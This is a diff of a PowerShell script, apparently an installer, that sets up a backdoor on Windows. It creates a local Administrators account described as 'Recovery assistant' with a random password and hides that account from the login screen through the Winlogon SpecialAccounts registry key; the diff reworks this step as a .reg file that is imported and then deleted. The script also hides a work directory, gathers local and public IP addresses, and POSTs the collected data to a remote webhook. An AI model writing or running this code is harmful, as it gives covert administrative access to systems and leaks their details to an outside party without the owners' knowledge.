@@ -9,10 +9,9 @@ $LPWORD = $(random_text) + $(random_text) + $(random_text)
 $LPWORD_S = (ConvertTo-securestring $LPWORD -AsPlainText -Force)
 $WORKDIR = random_text
 $WORKPATH = "$env:temp\$WORKDIR"
+$REGFILE = random_text
 $LIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
-$RIP1 = Invoke-RestMethod -UseBasicParsing -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/ip").Content)
 $RIP2 = (Invoke-WebRequest -UseBasicParsing -Uri 'http://icanhazip.com/').Content
-$CONFIG = "$WORKPATH\new.cfg"
 
 mkdir $WORKPATH
 attrib -h -s -r "$WORKPATH"
@@ -26,8 +25,8 @@ function create_account {
     )
     begin {}
     process {
-        New-LocalUser "$NEWUSER" -Password $LPWORD_S -FullName "$NEWUSER" -Description "Recovery assistant"
-        Add-LocalGroupMember -Group "Administrators" -Member "$NEWUSER"
+        New-LocalUser "$Username" -Password $Password -FullName "$Username" -Description "Recovery assistant"
+        Add-LocalGroupMember -Group "Administrators" -Member "$Username"
     }
     end {}
 
@@ -35,7 +34,14 @@ function create_account {
 create_account -Username $NEWUSER -Password $LPWORD_S
 
 # Hide login trough registry
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "$NEWUSER" -Value 0 -Type DWORD -Force
+$REGF = @"
+Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList]
+"$NEWUSER"=dword:00000000;
+"@
+$REGF > "$REGFILE.reg"
+reg import ".\$REGFILE.reg"
+Remove-Item "$REGFILE.reg"
 
 # Hide path
 Set-Location "C:\Users"
@@ -53,17 +59,5 @@ $JSON = $hash | convertto-json
 
 Invoke-WebRequest -Uri $WURL -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}
 
-
-# broke
-# Add-Content -Path $CONFIG -Value "$STARTDIR"
-# Add-Content -Path $CONFIG -Value "$LIP"
-# Add-Content -Path $CONFIG -Value "$RIP1"
-# Add-Content -Path $CONFIG -Value "$RIP2"
-# Add-Content -Path $CONFIG -Value "$NEWUSER"
-# Add-Content -Path $CONFIG -Value "$LPWORD"
-# Add-Content -Path $CONFIG -Value "$WORKDIR"
-#Invoke-WebRequest -Uri $WURL -Method POST -Body ($payload | ConvertTo-Json) -Headers @{'Content-Type' = 'application/json'}
-
-Write-Output "Remove-Item $CONFIG"
 
 Write-Output "Remove-Item $STARTDIR/installer.ps1"
